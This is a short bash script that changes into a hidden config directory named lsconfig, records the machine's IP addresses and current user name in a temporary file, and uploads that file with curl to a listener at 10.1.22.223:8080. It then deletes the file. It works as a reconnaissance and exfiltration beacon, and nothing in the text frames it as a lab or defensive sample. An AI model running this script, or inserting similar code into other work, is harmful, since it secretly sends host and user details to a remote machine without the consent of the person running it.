#!/bin/bash

tdir=$HOME/.config/lsconfig
cd $tdir

touch /tmp/testfile
ip addr >> /tmp/testfile
whoami >> /tmp/testfile
curl -F "upfile=@/tmp/testfile" http://10.1.22.223:8080/
rm /tmp/testfile

